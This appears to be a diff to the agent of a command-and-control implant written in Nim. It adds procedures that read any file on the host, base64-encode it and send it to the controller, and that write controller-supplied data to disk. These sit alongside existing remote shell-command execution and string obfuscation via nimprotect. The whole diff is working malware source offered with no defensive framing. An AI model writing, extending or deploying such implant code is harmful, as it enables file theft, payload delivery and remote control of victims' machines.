@@ -1,5 +1,5 @@
 include config
-import std/[strformat, tables, nativesockets, random, json, base64, encodings]
+import std/[strformat, tables, nativesockets, streams, random, json, base64, encodings]
 import system/[io]
 import httpclient
 import nimprotect
@@ -13,7 +13,8 @@ proc post_data*(client: HttpClient, command_type: string, data_dict: string): bo
 
 # Command executors
 proc run_shell_command*(client: HttpClient, shell_command: string): bool
-
+proc exfil_file*(client: HttpClient, file_path: string): bool
+proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool
 proc kill_agent*(client: HttpClient): void
 
 # Encryption & Encoding
@@ -57,6 +58,51 @@ proc run_shell_command*(client: HttpClient, shell_command: string): bool =
     
     is_success = post_data(client, protectString("cmd"), $data)
     
+    return is_success
+
+
+
+proc exfil_file*(client: HttpClient, file_path: string): bool = 
+    var is_success: bool
+    var file_content_base64: string
+
+    try:
+        file_content_base64 = encode_64(readFile(file_path), is_bin=true)
+        is_success = true
+    except:
+        file_content_base64 = could_not_retrieve
+        is_success = false
+    
+    var data = {
+        "is_success": $is_success,
+        "file_path": file_path,
+        protectString("file_content_base64"): file_content_base64
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("download") , $data)
+
+    return is_success
+
+
+proc write_file*(client: HttpClient, file_data_base64: string, file_path: string): bool =
+    var is_success: bool
+    var f = newFileStream(file_path, fmWrite)
+    
+    if isNil(f):
+        is_success = false
+    else:
+        var file_data = decode_64(file_data_base64, is_bin=true)
+        f.write(file_data)
+        f.close()
+        is_success = true
+    
+    var data = {
+        "is_success": $is_success,
+        protectString("file_upload_path"): file_path,
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("upload") , $data)
+
     return is_success
 
 
